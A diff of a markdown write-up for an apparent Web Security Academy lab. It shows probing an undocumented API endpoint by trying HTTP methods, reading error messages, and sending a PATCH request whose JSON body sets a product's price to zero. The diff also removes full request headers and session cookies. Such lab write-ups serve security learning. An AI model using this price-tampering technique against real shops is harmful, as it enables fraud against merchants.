@@ -1,4 +1,4 @@
-# Lab - 02 : Finding and exploiting an unused API endpoint
+# Finding and exploiting an unused API endpoint
 
 Topic :  Finding and exploiting an unused API endpoint
 
@@ -13,37 +13,19 @@ Analysis :
 
 ```
 GET /api/products/1/price HTTP/2
-Host: 0aaf0022031daec784d79b23004400b1.web-security-academy.net
-Cookie: session=9rXCi9dmOLzFqw52QGzLlYxe37bc9pBY
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: https://0aaf0022031daec784d79b23004400b1.web-security-academy.net/product?productId=1
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Priority: u=4
-Te: trailers
 ```
 
 - API response to this :
 
 ```
-HTTP/2 200 OK
-Content-Type: application/json; charset=utf-8
-X-Frame-Options: SAMEORIGIN
-Content-Length: 91
-
 {
-"price":"$1337.00",
-"message":"Your neighbor just bought 2 of these! Don't feel left out!"
+    "price":"$1337.00",
+    "message":"Your neighbor just bought 2 of these! Don't feel left out!"
 }
 ```
 
 - The message keeps getting randomized, everytime.
-- Let’s find the documentation now.
-- could not find in the usual places.
+
 - Let’s brute force the API endpoint now using gobuster
 - Brute forcing doesn’t work in this case
 - Let’s mess with the requests sent to the api and take hints from the error messages as said in the description
@@ -56,15 +38,11 @@ Content-Length: 91
 - Only interesting request was PATCH, when i sent a body along with it, it shows this message :
 
 ```
-HTTP/2 400 Bad Request
-Content-Type: application/json; charset=utf-8
-X-Frame-Options: SAMEORIGIN
-Content-Length: 93
 
 {
-"type":"ClientError",
-"code":400,
-"error":"Only 'application/json' Content-Type is supported"
+    "type":"ClientError",
+    "code":400,
+    "error":"Only 'application/json' Content-Type is supported"
 }
 ```
 
@@ -74,21 +52,7 @@ Content-Length: 93
     
     ```
     PATCH /api/products/1/price HTTP/2
-    Host: 0aaf0022031daec784d79b23004400b1.web-security-academy.net
-    Cookie: session=zWbBjyJBwLrv86Oc1ScwpAD4ehVfdg0t
-    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-    Accept: */*
-    Accept-Language: en-US,en;q=0.5
-    Accept-Encoding: gzip, deflate, br
-    Referer: https://0aaf0022031daec784d79b23004400b1.web-security-academy.net/product?productId=1
-    Sec-Fetch-Dest: empty
-    Sec-Fetch-Mode: cors
-    Sec-Fetch-Site: same-origin
-    Priority: u=4
-    Te: trailers
-    Content-Length: 24
-    Content-Type: application/json
-    
+
     {
     	"price" : "$12"
     }
@@ -113,7 +77,6 @@ Content-Length: 98
 - Adhering to the rules…
 
 ```
-
 {
 	"price" : 0
 }
